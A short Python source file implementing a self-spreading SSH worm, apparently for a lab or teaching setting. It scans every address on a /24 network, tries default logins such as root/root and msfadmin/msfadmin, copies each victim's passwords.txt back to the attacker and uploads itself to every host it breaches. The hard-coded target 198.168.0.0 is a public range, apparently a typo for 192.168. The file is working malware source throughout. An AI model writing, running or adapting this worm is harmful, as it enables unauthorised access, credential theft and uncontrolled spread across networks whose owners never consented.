#!/usr/bin/env python3

""" Implementation of simple worm that spreads via SSH connection.
"""

import logging
import paramiko
import scp
import sys


class Worm:
    """ This class represents implementation of worm that spreads via SSH
    connections.
    """

    def __init__(self, network_address):
        self._network = network_address

    @property
    def network(self):
        """ Network, on which the worm spreads. """
        return self._network

    @network.setter
    def network(self, new_network):
        self._network = new_network

    @property
    def credentials(self):
        """ Possible SSH credentials of the victim. """
        return (
            ('user', 'user'),
            ('root', 'root'),
            ('msfadmin', 'msfadmin')
        )

    def generate_addresses_on_network(self):
        """ Generate addresses of hosts on the given network.
        For simplicity is expected the following mask:
        255.255.255.0
        """
        network = self.network.split('.')
        for host in range(1, 256):
            network[-1] = str(host)
            yield '.'.join(network)

    def spread_via_ssh(self):
        """ Spread the worm on the network via SSH connections.
        To establish SSH connection try selected user-password
        combinations. When the connection is established, copy
        the worm to the remote host.
        """
        # Setup SSH client.
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for remote_address in self.generate_addresses_on_network():
            logging.debug('Trying to spread on the remote host: {}'.format(remote_address))
            for user, passw in self.credentials:
                try:
                    ssh.connect(remote_address, port=22, username=user, password=passw, timeout=10)
                    logging.debug('The worm is succesfully connected to the remote host [{}, {}].'.format(user, passw))

                    # Create SCP client for file transmission.
                    scp_client = scp.SCPClient(ssh.get_transport())
                    # Obtain file with victim's passwords.
                    try:
                        scp_client.get('passwords.txt')
                        logging.debug('The victim had passwords.txt')
                    except Exception:
                        logging.debug('The victim did not have passwords.txt')

                    # Upload worm to the remote host.
                    scp_client.put(sys.argv[0])
                    print()

                except Exception:
                    logging.debug('The remote host refused connection with credentials {},{}.'.format(user, passw))


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)
    # Disable basic logging of paramiko to make log easier to read.
    logging.getLogger('paramiko').setLevel(logging.CRITICAL)

    # Initialize worm with the network address.
    worm = Worm('198.168.0.0')
    # Spread via SSH connection on the network.
    worm.spread_via_ssh()
